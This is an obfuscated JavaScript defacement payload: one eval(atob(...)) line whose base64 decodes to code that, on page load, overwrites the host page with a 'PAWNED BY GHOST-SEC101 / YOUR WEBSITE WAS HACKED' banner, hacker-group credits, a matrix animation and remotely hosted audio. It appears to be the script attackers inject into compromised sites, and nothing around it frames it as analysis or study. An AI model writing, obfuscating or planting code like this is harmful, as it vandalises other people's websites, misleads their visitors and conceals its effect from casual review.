eval(atob('KGZ1bmN0aW9uKCl7CiAgZnVuY3Rpb24gZ28oKXsKICAgIGRvY3VtZW50Lm9wZW4oKTsgZG9jdW1lbnQud3JpdGUoYDwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+Cjx0aXRsZT5QQVdORUQgQlkgR0hPU1QtU0VDMTAxPC90aXRsZQ==
+CjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9IOXRzcTJRLzE3NTgyNTE1OTc4ODUucG5nIj4KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1Hb2xkbWFuJmRpc3BsYXk9c3dhcCIgcmVsPSJzdHlsZXNoZWV0Ij4KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5jZG5mb250cy5jb20vY3NzL2Nhdmlhci1kcmVhbXMiIHJlbD0ic3R5bGVzaGVldCI+CjxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuY2RuZm9udHMuY29tL2Nzcy9uZXZpcyIgcmVsPSJzdHlsZXNoZWV0Ij4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNi41LjAvY3NzL2FsbC5taW4uY3NzIj4KCjxzdHlsZT4KQGZvbnQtZmFjZSB7CmZvbnQtZmFtaWx5OiAnQW5vbnltb3VzRm9udCc7CnNyYzogdXJsKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmFraWxhZ2VvcmdlNjkvYW5vbnltb3VzL21haW4vbXkudHRmJykgZm9ybWF0KCd0cnVldHlwZScpOwp9Cgpib2R5IHsKZm9udC1mYW1pbHk6ICJHb2xkbWFuIiwgbW9ub3NwYWNlOwptYXJnaW46IDA7IHBhZGRpbmc6IDIwcHg7CnRleHQtYWxpZ246IGNlbnRlcjsKY29sb3I6IHdoaXRlOwpiYWNrZ3JvdW5kOiBibGFjazsKbWluLWhlaWdodDogMTAwdmg7Cm92ZXJmbG93LXg6IGhpZGRlbjsKZGlzcGxheTogZmxleDsKZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKanVzdGlmeS1jb250ZW50OiBjZW50ZXI7CmFsaWduLWl0ZW1zOiBjZW50ZXI7CmdhcDogOHB4Owp9CgojYmctY29udGFpbmVyIHsKcG9zaXRpb246IGZpeGVkOyB0b3A6IDA7IGxlZnQ6IDA7CndpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7CnotaW5kZXg6IC0zOwp9CiN2aWRlby1iZyB7CnBvc2l0aW9uOiBhYnNvbHV0ZTsgdG9wOiAwOyBsZWZ0OiAwOwp3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOwpvYmplY3QtZml0OiBjb3ZlcjsKfQojbWF0cml4IHsKcG9zaXRpb246IGFic29sdXRlOyB0b3A6IDA7IGxlZnQ6IDA7CndpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7CnotaW5kZXg6IDE7IG9wYWNpdHk6IDAuMzsKfQpib2R5OjphZnRlciB7CmNvbnRlbnQ6ICIiOwpwb3NpdGlvbjogZml4ZWQ7CnRvcDogMDsgbGVmdDogMDsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsKYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjQpOwp6LWluZGV4OiAtMjsKfQoKLnByb2ZpbGUtaW1nIGltZyB7CndpZHRoOiAyMjBweDsgaGVpZ2h0OiAyMjBweDsKb2JqZWN0LWZpdDogY292ZXI7CmJvcmRlci1yYWRpdXM6IDUwJTsKfQoKLm1haW4tdGl0bGUgewpmb250LWZhbWlseTogJ0Fub255bW91c0ZvbnQnLCBzZXJpZjsKZm9udC1zaXplOiAyLjhlbTsKY29sb3I6IHJlZDsKbWFyZ2luOiAwOwpmb250LXdlaWdodDogbm9ybWFsOwpsZXR0ZXItc3BhY2luZzogMnB4Owp0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwp0ZXh0LXNoYWRvdzogMCAwIDNweCByZWQsIDAgMCA1MHB4IHJlZCwgMCAwIDUwcHggcmVkOwp9CgovKiBIZWFkZXIgd2l0aCB0b3AgYm9yZGVyICovCi5oZWFkZXItdG9wIHsKcG9zaXRpb246IGZpeGVkOwp0b3A6IDA7IGxlZnQ6IDA7CndpZHRoOiAxMDAlOwpiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNik7CnBhZGRpbmc6IDE1cHggMDsKei1pbmRleDogMjA7Cn0KLmhlYWRlci10b3A6OmFmdGVyIHsKY29udGVudDogIiI7CmRpc3BsYXk6IGJsb2NrOwp3aWR0aDogMTAwJTsKaGVpZ2h0OiA0cHg7CmJhY2tncm91bmQ6IHJlZDsKYm94LXNoYWRvdzogMCAwIDE1cHggcmVkLCAwIDAgMzBweCByZWQ7Cn0KCi5oZWFkZXItdG9wIGgxIHsKbWFyZ2luOiAwOwpmb250LWZhbWlseTogJ0Fub255bW91c0ZvbnQnLCBzZXJpZjsKZm9udC1zaXplOiAzZW07CmNvbG9yOiB3aGl0ZTsKdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKbGV0dGVyLXNwYWNpbmc6IDNweDsKdGV4dC1zaGFkb3c6IDAgMCAxMHB4IHJlZCwgMCAwIDI1cHggcmVkLCAwIDAgNTBweCByZWQ7Cn0KLnN1YnRleHQgewpmb250LXNpemU6IDAuOWVtOwpjb2xvcjogcmVkOwpsZXR0ZXItc3BhY2luZzogMnB4OwptYXJnaW4tdG9wOiA2cHg7Cm1hcmdpbi1ib3R0b206IDZweDsKfQoKLyogR3JlZXRpbmdzIGFuZCBDb2xsYWJvcmF0b3JzIGluIE5ldmlzICovCmg0LmdyZWV0aW5ncywKaDQuY29sbGFib3JhdG9ycyB7CmZvbnQtZmFtaWx5OiAnQWx1c3JnJywgc2Fucy1zZXJpZjsKZm9udC1zaXplOiAxZW07CmNvbG9yOiB3aGl0ZTsKdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKbGV0dGVyLXNwYWNpbmc6IDJweDsKbWFyZ2luOiAxMHB4IDA7CnRleHQtc2hhZG93OiAwIDAgMTBweCByZWQsIDAgMCAyNXB4IHJlZCwgMCAwIDUwcHggcmVkOwp9Cgouc3R5bGVkLXRleHQgewpmb250LWZhbWlseTogJ0NhdmlhciBEcmVhbXMnLCBzYW5zLXNlcmlmOwpmb250LXNpemU6IDEuMnJlbTsKd2hpdGUtc3BhY2U6IHByZS1saW5lOwpsaW5lLWhlaWdodDogMS40Owpmb250LXdlaWdodDogbm9ybWFsOwptYXJnaW46IDA7Cn0KCi5jbG9jayB7IGZvbnQtc2l6ZTogMWVtOyBjb2xvcjogcmVkOyBtYXJnaW46IDA7IH0KLmRhdGUgeyBmb250LXNpemU6IDFlbTsgY29sb3I6IHdoaXRlOyBtYXJnaW46IDA7IH0KCi5tYXJxdWVlIHsgd2lkdGg6IDI1MHB4OyBtYXJnaW46IDJweCBhdXRvOyBvdmVyZmxvdzogaGlkZGVuOyB3aGl0ZS1zcGFjZTogbm93cmFwOyB9Ci5tYXJxdWVlIHNwYW4gewpkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CmNvbG9yOiB3aGl0ZTsKZm9udC1zaXplOiAxcmVtOwpmb250LWZhbWlseTogJ0NhdmlhciBEcmVhbXMnLCBzYW5zLXNlcmlmOwpwYWRkaW5nLXJpZ2h0OiA1MHB4Owp9Cgouc29jaWFsLWljb25zIHsKbWFyZ2luLXRvcDogMTJweDsKZGlzcGxheTogZmxleDsKanVzdGlmeS1jb250ZW50OiBjZW50ZXI7CmdhcDogMjBweDsKfQouc29jaWFsLWljb25zIGEgewpjb2xvcjogd2hpdGU7CmZvbnQtc2l6ZTogMS44ZW07CnRleHQtc2hhZG93OiAwIDAgMTBweCByZWQsIDAgMCAyMHB4IHJlZCwgMCAwIDQwcHggcmVkOwp0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4ycyBlYXNlLWluLW91dDsKfQouc29jaWFsLWljb25zIGE6aG92ZXIgeyB0cmFuc2Zvcm06IHNjYWxlKDEuMik7IGNvbG9yOiByZWQ7IH0KCi8qIENvcHlyaWdodCB3aXRoIGJvdHRvbSBib3JkZXIgKi8KLmNvcHlyaWdodC1iYXIgewpwb3NpdGlvbjogZml4ZWQ7CmJvdHRvbTogMDsgbGVmdDogMDsKd2lkdGg6IDEwMCU7CmJhY2tncm91bmQ6IHJnYmEoMCwwLDAsMC42KTsKcGFkZGluZzogMTVweCAwOwp9Ci5jb3B5cmlnaHQtYmFyOjpiZWZvcmUgewpjb250ZW50OiAiIjsKZGlzcGxheTogYmxvY2s7CndpZHRoOiAxMDAlOwpoZWlnaHQ6IDRweDsKYmFja2dyb3VuZDogcmVkOwpib3gtc2hhZG93OiAwIDAgMTVweCByZWQsIDAgMCAzMHB4IHJlZDsKfQouY29weXJpZ2h0LWJhciBoNCB7Cm1hcmdpbjogMjBweDsKZm9udC1zaXplOiAxZW07CmNvbG9yOiB3aGl0ZTsKZm9udC1mYW1pbHk6ICdDYXZpYXIgRHJlYW1zJywgc2Fucy1zZXJpZjsKdGV4dC1zaGFkb3c6IDAgMCAxMHB4IHJlZCwgMCAwIDI1cHggcmVkLCAwIDAgNTBweCByZWQ7Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iYmctY29udGFpbmVyIj4KPHZpZGVvIGlkPSJ2aWRlby1iZyIgYXV0b3BsYXkgbXV0ZWQgbG9vcCBwbGF5c2lubGluZT4KPHNvdXJjZSBzcmM9Imh0dHBzOi8vaWsuaW1hZ2VraXQuaW8vdnQwbjNqbHp4L2JhY2tncm91bmQud2VibS9pay12aWRlby5tcDQ/dXBkYXRlZEF0PTE3NTc1ODk1MjYyODciIHR5cGU9InZpZGVvL21wNCI+CjwvdmlkZW8+CjxjYW52YXMgaWQ9Im1hdHJpeCI+PC9jYW52YXM+CjwvZGl2PgoKPGRpdiBjbGFzcz0iaGVhZGVyLXRvcCI+CjxoMT5HSE9TVCBTRUNVUklUWSBTT0NJRVRZPC9oMT4KPGRpdiBjbGFzcz0ic3VidGV4dCI+UkVEIEhBVCBIQUNLRVI8L2Rpdj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJtYWluLXRpdGxlIj5ZT1VSIFdFQlNJVEUgV0FTIEhBQ0tFRDwvZGl2
+Cgo8ZGl2IGNsYXNzPSJwcm9maWxlLWltZyI+CjxpbWcgc3JjPSJodHRwczovL2kuaWJiLmNvL0g5dHNxMlEvMTc1ODI1MTU5Nzg4NS5wbmciIGFsdD0iUHJvZmlsZSBJbWFnZSI+CjwvZGl2PgoKPGg0IGNsYXNzPSJncmVldGluZ3MiPkdSRUVUSU5HUzwvaDQ+Cgo8cCBpZD0idHlwZXdyaXRlciIgY2xhc3M9InN0eWxlZC10ZXh0Ij48L3A+CjxwIGlkPSJxdW90ZSIgY2xhc3M9InN0eWxlZC10ZXh0Ij48L3A+Cgo8ZGl2IGNsYXNzPSJkYXRlIiBpZD0iZGF0ZSI+PC9kaXY+CjxkaXYgY2xhc3M9ImNsb2NrIiBpZD0iY2xvY2siPjwvZGl2PgoKPGg0IGNsYXNzPSJjb2xsYWJvcmF0b3JzIj5DT0xMQUJPUkFURVM8L2g0Pgo8ZGl2IGNsYXNzPSJtYXJxdWVlIj4KPG1hcnF1ZWUgYmVoYXZpb3I9InNjcm9sbCIgZGlyZWN0aW9uPSJsZWZ0IiBzY3JvbGxhbW91bnQ9IjUiPgo8c3Bhbj4tIFsgQkxBS0VaLCBQSC1IQVosIEdSRVhYIENVUlNFRCBBU0lBLCBQSC1BQ01BRCwgTEVJLCBQQVdORUQgUEgsIFZVTE4gU0VDLCBWSU5EUkFYIFBIIF0gLTwvc3Bhbj4KPC9tYXJxdWVlPgo8L2Rpdj4KCjxkaXYgY2xhc3M9InNvY2lhbC1pY29ucyI+CjxhIGhyZWY9IiMiPjxpIGNsYXNzPSJmYWIgZmEtaW5zdGFncmFtIj48L2k+PC9hPgo8YSBocmVmPSIjIj48aSBjbGFzcz0iZmFiIGZhLWZhY2Vib29rIj48L2k+PC9hPgo8YSBocmVmPSIjIj48aSBjbGFzcz0iZmFiIGZhLXdoYXRzYXBwIj48L2k+PC9hPgo8YSBocmVmPSIjIj48aSBjbGFzcz0iZmFiIGZhLXRpa3RvayI+PC9pPjwvYT4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJjb3B5cmlnaHQtYmFyIj4KPGg0Pn4gQ29weXJpZ2h0IMKpIDIwMTkgQWxsIFJpZ2h0IFJlc2VydmVkIH4gPC9oND4KPC9kaXY+Cgo8YXVkaW8gaWQ9Im15QXVkaW8iIGxvb3A+Cjxzb3VyY2Ugc3JjPSJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL3JGYXBWa1g1bm5uY1lNdnJ1dEpvWFVYTHBCVHZOc05hIiB0eXBlPSJhdWRpby9tcGVnIj4KPC9hdWRpbz4KPGF1ZGlvIGlkPSJuYXJyYXRpb25BdWRpbyI+Cjxzb3VyY2Ugc3JjPSJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL3VoRDdiQ3ZUc1F0VG55WW1ZUzhWWVJYazZUak1sQkZZIiB0eXBlPSJhdWRpby9tcGVnIj4KPC9hdWRpbz4KCjxzY3JpcHQ+CmZ1bmN0aW9uIHVwZGF0ZUNsb2NrKCl7CmNvbnN0IG5vdz1uZXcgRGF0ZSgpOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2xvY2snKS50ZXh0Q29udGVudD1ub3cudG9Mb2NhbGVUaW1lU3RyaW5nKCdlbi1HQicse2hvdXIxMjpmYWxzZX0pOwpjb25zdCBtb250aHM9WyJKQU4iLCJGRUIiLCJNQVIiLCJBUFIiLCJNQVkiLCJKVU4iLCJKVUwiLCJBVUciLCJTRVAiLCJPQ1QiLCJOT1YiLCJERUMiXTsKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGUnKS50ZXh0Q29udGVudD1cYFwke21vbnRoc1tub3cuZ2V0TW9udGgoKV19IDogXCR7U3RyaW5nKG5vdy5nZXREYXRlKCkpLnBhZFN0YXJ0KDIsJzAnKX0gOiBcJHtub3cuZ2V0RnVsbFllYXIoKX1cYDsKfQpzZXRJbnRlcnZhbCh1cGRhdGVDbG9jaywxMDAwKTsgdXBkYXRlQ2xvY2soKTsKCmNvbnN0IGF1ZGlvPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJteUF1ZGlvIik7CmNvbnN0IG5hcnJhdGlvbj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibmFycmF0aW9uQXVkaW8iKTsKYXVkaW8udm9sdW1lPTAuMzsgbmFycmF0aW9uLnZvbHVtZT0xLjA7CmZ1bmN0aW9uIHBsYXlBbGwoKXsgYXVkaW8ubXV0ZWQ9ZmFsc2U7IGF1ZGlvLnBsYXkoKS5jYXRjaCgoKT0+e30pOyBuYXJyYXRpb24ucGxheSgpLmNhdGNoKCgpPT57fSk7IH0KYXVkaW8ucGxheSgpLmNhdGNoKCgpPT57IFsiY2xpY2siLCJrZXlkb3duIiwidG91Y2hzdGFydCJdLmZvckVhY2goZXZ0PT57IGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoZXZ0LGZ1bmN0aW9uIGgoKXtwbGF5QWxsKCk7ZG9jdW1lbnQucmVtb3ZlRXZlbnRMaXN0ZW5lcihldnQsaCk7fSk7IH0pOyB9KTsKCmNvbnN0IG1zZz1cYFlvdXIgd2Vic2l0ZSB3YXMgaGFja2VkIGR1ZSB0byB3ZWFrIHNlY3VyaXR5LgpUaGlzIGlzIG9ubHkgYSB3YXJuaW5nIGZvciBZb3UKUGxlYXNlIGZpeCBpdCBhcyBzb29uIGFzIHBvc3NpYmxlLlxgOwpsZXQgaT0wOwpmdW5jdGlvbiB0eXBlV3JpdGVyKCl7CmlmKGk8bXNnLmxlbmd0aCl7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0eXBld3JpdGVyIikudGV4dENvbnRlbnQrPW1zZy5jaGFyQXQoaSk7CmkrKzsgc2V0VGltZW91dCh0eXBlV3JpdGVyLDQwKTsKfQp9Cm5hcnJhdGlvbi5hZGRFdmVudExpc3RlbmVyKCJwbGF5IiwoKT0+eyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidHlwZXdyaXRlciIpLnRleHRDb250ZW50PSIiOyBpPTA7IHR5cGVXcml0ZXIoKTsgfSk7Cgpjb25zdCBjPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtYXRyaXgiKTsKY29uc3QgY3R4PWMuZ2V0Q29udGV4dCgiMmQiKTsKYy5oZWlnaHQ9aW5uZXJIZWlnaHQ7IGMud2lkdGg9aW5uZXJXaWR0aDsKY29uc3QgbGV0dGVycz0iMDEiOyBjb25zdCBmb250U2l6ZT0xNDsgY29uc3QgY29sdW1ucz1jLndpZHRoL2ZvbnRTaXplOwpjb25zdCBkcm9wcz1BcnJheShNYXRoLmZsb29yKGNvbHVtbnMpKS5maWxsKDEpOwpmdW5jdGlvbiBkcmF3KCl7CmN0eC5maWxsU3R5bGU9InJnYmEoMCwwLDAsMC4wNSkiOwpjdHguZmlsbFJlY3QoMCwwLGMud2lkdGgsYy5oZWlnaHQpOwpjdHguZmlsbFN0eWxlPSIjMGYwIjsgY3R4LmZvbnQ9Zm9udFNpemUrInB4IG1vbm9zcGFjZSI7CmZvcihsZXQgaT0wO2k8ZHJvcHMubGVuZ3RoO2krKyl7CmNvbnN0IHRleHQ9bGV0dGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqbGV0dGVycy5sZW5ndGgpXTsKY3R4LmZpbGxUZXh0KHRleHQsaSpmb250U2l6ZSxkcm9wc1tpXSpmb250U2l6ZSk7CmlmKGRyb3BzW2ldKmZvbnRTaXplPmMuaGVpZ2h0JiZNYXRoLnJhbmRvbSgpPjAuOTc1KWRyb3BzW2ldPTA7CmRyb3BzW2ldKys7Cn0KfQpzZXRJbnRlcnZhbChkcmF3LDMzKTsKPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpgKTsgZG9jdW1lbnQuY2xvc2UoKTsKICB9CiAgaWYgKGRvY3VtZW50LnJlYWR5U3RhdGUgPT09ICdsb2FkaW5nJykgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGdvKTsKICBlbHNlIGdvKCk7Cn0pKCk7'));
